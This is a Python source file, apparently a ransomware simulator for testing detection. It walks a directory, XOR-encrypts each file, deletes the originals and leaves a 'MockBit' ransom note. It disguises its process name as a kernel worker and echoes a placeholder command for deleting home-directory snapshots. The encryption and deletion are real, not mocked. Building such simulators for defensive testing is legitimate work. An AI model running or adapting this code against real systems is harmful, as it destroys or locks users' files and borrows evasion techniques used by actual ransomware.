from __future__ import annotations

import os
import tempfile
import subprocess
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

try:
    import setproctitle
except Exception:  # pragma: no cover - optional dependency
    setproctitle = None

NOTE_TEXT = (
    "Your files have been encrypted by MockBit-Test.\n"
    "This is ONLY a test. No real ransom. Key = AA.\n"
)

_KEY = 0xAA


def _xor_bytes(data: bytes) -> bytes:
    return bytes(b ^ _KEY for b in data)


def _process_file(file_path: Path) -> None:
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        enc = _xor_bytes(data)
        tmp_fd, tmp_name = tempfile.mkstemp(dir=str(file_path.parent))
        with os.fdopen(tmp_fd, "wb") as tmp:
            tmp.write(enc)
            tmp.flush()
            os.fsync(tmp.fileno())
        out = file_path.with_suffix(file_path.suffix + ".mocklock")
        os.replace(tmp_name, out)
        os.unlink(file_path)
    except Exception:
        # Fail silently; this is only a simulation
        pass


def run_simulation(target_dir: Path, threads: int = 8) -> None:
    """Run a ransomware-like simulation on *target_dir*."""

    if setproctitle is not None:
        try:
            setproctitle.setproctitle("kworker/u:1-enc")
        except Exception:
            pass

    target_dir = Path(target_dir)
    with ThreadPoolExecutor(max_workers=threads) as exe:
        for dirpath, _, files in os.walk(target_dir):
            root = Path(dirpath)
            for name in files:
                fp = root / name
                if not fp.is_file() or fp.is_symlink():
                    continue
                exe.submit(_process_file, fp)
            note = root / "README_MOCKBIT_RESTORE.txt"
            try:
                with open(note, "w") as f:
                    f.write(NOTE_TEXT)
            except Exception:
                pass
    subprocess.run(["/bin/echo", "simulate rm -rf /home/*/.snapshots"])
